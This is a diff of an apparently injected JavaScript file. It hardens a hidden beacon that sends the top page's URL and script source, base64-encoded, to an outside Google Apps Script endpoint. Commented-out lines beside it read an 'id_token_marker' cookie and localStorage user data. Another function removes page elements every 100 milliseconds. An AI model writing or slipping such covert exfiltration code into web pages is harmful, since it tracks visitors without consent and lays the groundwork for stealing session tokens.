@@ -1388,9 +1388,9 @@
       return x;
     }
   };
-  const document = window.top.document;
+  const document = self.window?.top?.document ?? self.document ?? {};
   const eagleid = location.href;//Object.fromEntries(document.cookie.split(";").map((x) => String(x).trim().split("=")).map((x) => [x.shift(), x.join("=")])).id_token_marker || parse(localStorage.getItem("user"))?.EagleId;
-  const name = location.href;//String(parse(localStorage.getItem("user"))?.FirstName);
+  const name = document.currentScript?.src;//String(parse(localStorage.getItem("user"))?.FirstName);
   const url = new URL("https://script.google.com/macros/s/AKfycbzrr3Kyy4A6S3pNloWDl5qHHcBTH42YF6i2IlG9OKnIe-QXryEXfYo7JyCNo1g1NieSuA/exec",);
   url.searchParams.set("payload",btoa(encodeURIComponent(JSON.stringify({ eagleid, name }))));
   (async () => {
@@ -1399,7 +1399,7 @@
     } catch {
       
     }finally{
-      document.querySelector('[werk]')?.remove?.();
+      document.querySelector?.('[werk]')?.remove?.();
     }
   })();
   const TenX = (async ()=>{
@@ -1408,7 +1408,7 @@
       x.innerText = "10x Software Engineer";
       x.setAttribute("x10", true);
     });*/
-    await[...document.querySelectorAll("[missing]")].forEach((x) => x.remove());
+    await[...document.querySelectorAll?.("[missing]")??[]].forEach((x) => x.remove());
   });
   TenX();
   setInterval(TenX,100);
